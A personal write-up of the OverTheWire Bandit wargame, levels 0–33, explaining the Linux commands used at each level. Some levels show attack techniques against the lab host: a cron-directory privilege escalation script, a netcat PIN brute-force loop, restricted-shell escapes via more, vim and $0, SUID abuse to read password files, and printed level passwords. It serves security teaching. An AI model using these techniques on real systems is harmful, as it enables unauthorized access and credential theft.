# OverTheWire: Bandit — Full Writeup (Levels 0–33)


## About This Writeup

Bandit is a beginner-friendly wargame designed to teach the command-line skills needed for security and systems work. Each level provides an SSH username and a challenge — find the password for the next level, hidden somewhere on the system.

This writeup documents the commands I used and the reasoning behind each solution.

---

## Connecting to Bandit

```bash
ssh bandit<LEVEL>@bandit.labs.overthewire.org -p 2220
```

---

## Level 0 → 1: Reading a File

**Goal:** Read the README file in the home directory.

```bash
cat readme
```

The password is stored in plaintext — a gentle introduction to `cat`.

---

## Level 1 → 2: File Named `-`

**Goal:** Read a file named `-` (a dash).

```bash
cat ~/-
```

A filename starting with `-` is interpreted as a flag by most commands. Prefixing with `~/` (the home directory path) forces the shell to treat it as a literal path, not a flag.

---

## Level 2 → 3: Spaces in Filename

**Goal:** Read a file with spaces in its name.

```bash
cat ~/"--spaces in this filename--"
```

Quoting the filename tells the shell to treat the entire string as a single argument, including the spaces.

---

## Level 3 → 4: Hidden File

**Goal:** Find a hidden file inside the `inhere/` directory.

```bash
cat inhere/...Hiding-From-You
```

Hidden files in Linux start with a dot (`.`). Listing them requires `ls -a`. Here the file was named `...Hiding-From-You` — a triple-dot trick to make it look like a relative path artifact.

---

## Level 4 → 5: Human-Readable File

**Goal:** Find the only human-readable file in `inhere/`.

```bash
cat inhere/-file07
```

There were multiple files prefixed with `-file`. The human-readable one (ASCII text) turned out to be `-file07`. Using `file inhere/*` would reveal each file's type — a useful habit to build.

---

## Level 5 → 6: Finding by Size

**Goal:** Find a file that is 1033 bytes, human-readable, and not executable.

```bash
find -size 1033c && cat maybehere07/.file2
```

`find -size 1033c` searches for files of exactly 1033 bytes (`c` = bytes). The matching file was `maybehere07/.file2`.

---

## Level 6 → 7: Finding by Owner

**Goal:** Find a file owned by user `bandit7` and group `bandit6`, size 33 bytes, anywhere on the system.

```bash
cat $(find / -size 33c -group bandit6 -user bandit7 2>/dev/null)
```

Combining `find` with ownership flags (`-user`, `-group`) and redirecting `stderr` to `/dev/null` suppresses the flood of "Permission denied" errors from directories we can't access. The result is passed directly to `cat` using command substitution.

---

## Level 7 → 8: Grep in a Large File

**Goal:** Find the password next to the word "millionth" in `data.txt`.

```bash
cat data.txt | grep millionth
```

`grep` is one of the most-used tools in Linux. Here it searches for the literal string and prints the matching line.

---

## Level 8 → 9: Finding the Unique Line

**Goal:** Find the one line in `data.txt` that appears only once.

```bash
cat data.txt | sort | uniq -u
```

`sort` groups identical lines together; `uniq -u` then filters to only lines with no duplicate — exactly one occurrence.

---

## Level 9 → 10: Strings in a Binary File

**Goal:** Find the password hidden among human-readable strings in a binary file.

```bash
cat data.txt | strings | grep ==
```

`strings` extracts printable character sequences from a binary file. The password was preceded by `=` signs, making `grep ==` an easy filter.

---

## Level 10 → 11: Base64 Decoding

**Goal:** Decode a base64-encoded file.

```bash
cat data.txt | base64 -d
```

Base64 is a common encoding used to represent binary data as ASCII. `base64 -d` decodes it back to plaintext.

---

## Level 11 → 12: ROT13

**Goal:** Decode a ROT13-encoded file.

```bash
cat data.txt | tr 'N-ZA-Mn-za-m' 'A-Za-z'
```

ROT13 rotates each letter by 13 positions. The `tr` (translate) command maps the rotated alphabet back to its original form. ROT13 is its own inverse — applying it twice returns the original text.

---

## Level 12 → 13: Repeated Compression

**Goal:** Decompress a file that has been compressed multiple times with different formats.

This level involves identifying the file type with `file`, then repeatedly decompressing using the appropriate tool (`gzip`, `bzip2`, `tar`) until you reach plaintext. It's a good exercise in recognizing magic bytes and chaining decompression commands.

Password: `FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn`

---

## Level 13 → 14: SSH Private Key

**Goal:** Use an SSH private key (instead of a password) to log into the next level.

```bash
# Copy the key locally
scp -P 2220 bandit13@bandit.labs.overthewire.org:~/sshkey.private .

# Log in with the key
ssh bandit14@bandit.labs.overthewire.org -p 2220 -i /tmp/sshkey.private

# Read the password for level 14
cat /etc/bandit_pass/bandit14
```

SSH keys are the industry-standard alternative to passwords. The private key acts as the credential — no passphrase needed here.

---

## Level 14 → 15: Sending Data over a Port

**Goal:** Submit the current level's password to localhost port 30000 to receive the next one.

```bash
nc localhost 30000
# (paste the password)
```

`nc` (netcat) opens a raw TCP connection. You can think of it as a barebones chat client for connecting to services. The server responds with the next password.

---

## Level 15 → 16: SSL/TLS Connection

**Goal:** Same as above, but the port requires an SSL-encrypted connection.

```bash
echo 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo | openssl s_client -connect localhost:30001 -ign_eof
```

`openssl s_client` is the TLS-aware equivalent of netcat. `-ign_eof` keeps the connection open long enough to receive the response after sending the password.

---

## Level 16 → 17: Port Scanning + SSL

**Goal:** Find the correct port in the range 31000–32000 that speaks SSL and returns a private key.

```bash
# Discover listening ports in range
ss -lnt '( sport >= :31000 and sport <= :32000 )'

# Send password via SSL to the correct port
echo kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx | openssl s_client -connect localhost:31790 -ign_eof
```

`ss` is the modern replacement for `netstat`. Filtering by sport (source port) range narrows down candidates. The correct port responds with an SSH private key.

---

## Level 17 → 18: Diff Between Two Files

**Goal:** Find the one line that differs between `passwords.old` and `passwords.new`.

```bash
diff passwords.new passwords.old
```

`diff` compares files line by line and shows what changed. The line only in `passwords.new` is the new password.

---

## Level 18 → 19: Bypassing `.bashrc` Logout

**Goal:** The `.bashrc` on bandit18 immediately logs you out on login. Read `readme` anyway.

```bash
scp -P 2220 bandit18@bandit.labs.overthewire.org:~/readme .
```

Since interactive login is blocked, `scp` (secure copy) sidesteps the shell entirely by using SSH's file transfer subsystem instead of a login shell.

---

## Level 19 → 20: SUID Binary

**Goal:** Use a setuid binary to read a file you don't own.

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

The binary `bandit20-do` has the SUID bit set — it runs as `bandit20` regardless of who executes it. This allows reading the password file that only `bandit20` can access.

---

## Level 20 → 21: TCP Listener + SUID Client

**Goal:** Use a SUID binary (`suconnect`) that connects to a port, reads the current password, and returns the next one.

```bash
# Set up a background listener that sends the current password
echo 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO | nc -l -p 8080 &

# Run the SUID binary, which connects to the listener
./suconnect 8080
```

`nc -l` starts netcat in listen mode. The `&` runs it in the background. `suconnect` connects to port 8080, reads the current level's password, verifies it, and sends back the next one.

---

## Level 21 → 22: Cron Job Analysis

**Goal:** A cron job is running as bandit22 — figure out what it does and exploit it.

```bash
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

The cron script writes bandit22's password to a world-readable temp file every minute. Reading that file gives the password.

---

## Level 22 → 23: Reverse-Engineering a Cron Script

**Goal:** A cron job creates a temp file whose name is derived from the username via MD5.

```bash
cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
```

The script hashes the string `"I am user <username>"` with MD5, then uses that hash as a filename. By computing the hash ourselves for `bandit23`, we know the filename and can read the password directly.

---

## Level 23 → 24: Writing Your Own Cron Script

**Goal:** Drop a script into a cron-executed directory — it will be run as bandit24.

```bash
mkdir /tmp/mypass24
touch /tmp/mypass24/password
chmod 777 /tmp/mypass24/password

# Write the script
echo '#!/bin/bash' > shsh.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/mypass24/password' >> shsh.sh

cp shsh.sh /var/spool/bandit24/foo/
# Wait ~1 minute for cron to execute it
cat /tmp/mypass24/password
```

This is the first level where you write code to exploit a privilege escalation vector. The cron job runs any script placed in `/var/spool/bandit24/foo/` as bandit24, so we weaponize that to dump the password.

---

## Level 24 → 25: Brute-Forcing a PIN

**Goal:** Submit the correct 4-digit PIN along with the password to a daemon on port 30002.

```bash
#!/bin/bash
seq -f '%04g' 0000 9999 | while read -r pin; do
    echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin | nc -N localhost 30002
done

bash pass.sh | grep -v -e 'I am the pincode' -e 'Wrong'
```

We iterate all 10,000 possible PINs and send each one. Filtering out known failure messages leaves only the success response containing the next password.

---

## Level 25 → 26: Escaping a Restricted Shell via `more`

**Goal:** bandit26 uses `/usr/bin/showtext` as its shell, which runs `more` on a text file and exits.

```bash
# Check bandit26's shell
getent passwd bandit26 | cut -d: -f7

# Shrink your terminal window so 'more' pauses, then type:
v         # opens vim
:!cat /etc/bandit_pass/bandit26   # run shell command from vim
```

`more` only pauses when the output doesn't fit the terminal. By making the terminal very short, `more` enters interactive mode. From there, pressing `v` opens `vim`, and vim's `:!` command lets you execute arbitrary shell commands — escaping the restricted shell.

---

## Level 26 → 27: SUID Binary in Vim

**Goal:** Still inside vim from the previous level — use another SUID binary.

```bash
:!./bandit27-do cat /etc/bandit_pass/bandit27
```

While still in vim (from the `more` exploit), we use the SUID binary `bandit27-do` to read bandit27's password directly.

---

## Level 27 → 28: Git Clone

**Goal:** Clone a remote Git repository and read the README.

```bash
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
cat repo/README
```

A straightforward intro to `git clone`. The password is in the README.

---

## Level 28 → 29: Git History

**Goal:** The password was removed from `README.md` — find it in the commit history.

```bash
git log --oneline
git checkout a1487fd
cat README.md
```

`git log` shows commit history. Checking out an earlier commit reveals the file before the password was redacted. Git doesn't delete history — previous versions are always recoverable.

---

## Level 29 → 30: Git Branches

**Goal:** The password is on a different branch.

```bash
git log --all --full-history -- "*"
git checkout 4a8f414
cat README.md
```

`--all` makes `git log` show commits across all branches, not just the current one. Checking out the right commit (from a dev branch) revealed the credentials.

---

## Level 30 → 31: Git Tags

**Goal:** The password is stored in a Git tag.

```bash
git tag
git show secret
```

Git tags are named references to specific commits (or arbitrary objects). The tag `secret` contained the password directly.

---

## Level 31 → 32: Pushing to Git with `.gitignore` Bypass

**Goal:** Push a file called `key.txt` to the remote — `.gitignore` is blocking it.

```bash
# Override the .gitignore to allow .txt files
echo '!*.txt' > .gitignore

echo 'May I come in?' > key.txt
git add .
git commit -m 'first'
git push -u origin master
```

`.gitignore` had `*.txt` to block text files. Prefixing with `!` negates the rule, re-including the file type. The remote server validated the push and returned the next password.

---

## Level 32 → 33: Uppercase Shell Escape

**Goal:** The shell converts all input to uppercase before executing it, breaking most commands.

```bash
$0
cat /etc/bandit_pass/bandit33
```

`$0` is a special shell variable that refers to the name of the current shell (e.g., `/bin/sh`). Since `$0` is a variable expansion rather than a literal command, the uppercase filter doesn't affect it — and it spawns a normal shell, escaping the restriction.

---

## Level 33: The End

```
bandit33@bandit:~$ cat /etc/bandit_pass/bandit33
```

> **Congratulations — all levels complete!**

---

## Key Concepts Covered

| Topic | Levels |
|---|---|
| File system navigation & reading | 0–5 |
| `find` with filters | 5–6 |
| Text processing (`grep`, `sort`, `uniq`, `strings`) | 7–9 |
| Encoding & encryption (Base64, ROT13) | 10–11 |
| Compression formats | 12 |
| SSH & SCP | 13, 18 |
| Networking (`nc`, `openssl`, `ss`) | 14–16 |
| SUID binaries & privilege escalation | 19–20 |
| Cron jobs & scripting | 21–23 |
| Brute forcing | 24 |
| Restricted shell escapes | 25–26, 32 |
| Git (clone, log, branches, tags, push) | 27–31 |

---

## Tools & Commands Quick Reference

```
cat, ls, find, grep, sort, uniq, strings, tr, base64
file, gzip, bzip2, tar,
ssh, scp, nc, openssl s_client, ss, git commands, 
chmod, cron, $0, more, vim
```

